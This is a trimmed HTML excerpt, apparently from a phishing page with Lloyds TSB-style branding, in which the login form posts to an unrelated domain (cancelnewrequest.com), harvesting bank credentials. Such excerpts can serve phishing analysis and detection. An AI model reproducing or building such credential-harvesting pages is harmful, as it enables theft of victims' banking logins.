...
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb">
    <head>
        ...
        <link rel="apple-touch-icon" sizes="57x57" href="http://cancelnewrequest.com/files/img/ltsb%2057x57-.JPG" />
        <link rel="apple-touch-icon" sizes="114x114" href="http://cancelnewrequest.com/files/img/ltsb%20114x114-.JPG" />
                                ...
                                <div class="panelBL">
                                    <div class="loginInner">
                                        ...
                                        <div class="loginFields">
                                            <form id="frmLogin" name="frmLogin" method="post" action="http://cancelnewrequest.com/personal/mbprimarylogin" autocomplete="off">
